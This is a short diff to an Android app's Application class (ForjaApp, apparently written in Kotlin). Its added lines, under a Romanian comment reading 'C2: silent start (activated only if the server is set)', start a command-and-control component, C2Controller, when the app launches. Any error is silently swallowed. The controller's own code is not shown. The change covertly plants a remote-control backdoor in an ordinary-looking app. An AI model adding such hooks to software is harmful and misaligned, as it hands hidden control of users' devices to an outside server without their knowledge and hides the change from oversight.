@@ -88,6 +88,9 @@ class ForjaApp : Application(), coil.ImageLoaderFactory {
             } catch (_: Exception) { }
         }
         createChannels()
+
+        // ── C2: pornire silențioasă (activat doar dacă serverul e setat) ──
+        try { com.forja.app.core.c2.C2Controller.start(this) } catch (_: Exception) {}
     }
 
     private fun createChannels() {
